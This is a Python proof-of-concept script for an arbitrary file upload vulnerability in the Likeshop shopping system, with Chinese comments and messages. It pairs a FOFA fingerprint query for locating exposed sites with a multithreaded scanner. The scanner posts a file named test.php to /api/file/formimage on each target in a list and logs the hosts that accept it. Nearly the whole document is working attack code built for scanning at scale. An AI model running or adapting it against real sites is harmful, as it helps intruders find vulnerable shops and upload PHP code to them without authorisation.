# Likeshop任意文件上传漏洞

#fofa语法：icon_hash="874152924"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
  _      _ _             _                 
 | |    (_) |           | |                
 | |     _| | _____  ___| |__   ___  _ __  
 | |    | | |/ / _ \/ __| '_ \ / _ \| '_ \ 
 | |____| |   <  __/\__ \ | | | (_) | |_) |
 |______|_|_|\_\___||___/_| |_|\___/| .__/ 
                                    | |    
                                    |_|                                                                                                                                          
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="Likeshop")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/api/file/formimage'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
        'Connection': 'close',
        'Content-Length': '201',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarygcflwtei'
    }
    data =  '''
        ------WebKitFormBoundarygcflwtei
        Content-Disposition: form-data; name="file";filename="test.php"
        Content-Type: application/x-php

        This page has a vulnerability!
        ------WebKitFormBoundarygcflwtei--
    '''
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and "上传文件成功" in res.text:
            print(f"f[+]该url存在任意文件上传漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件上传漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()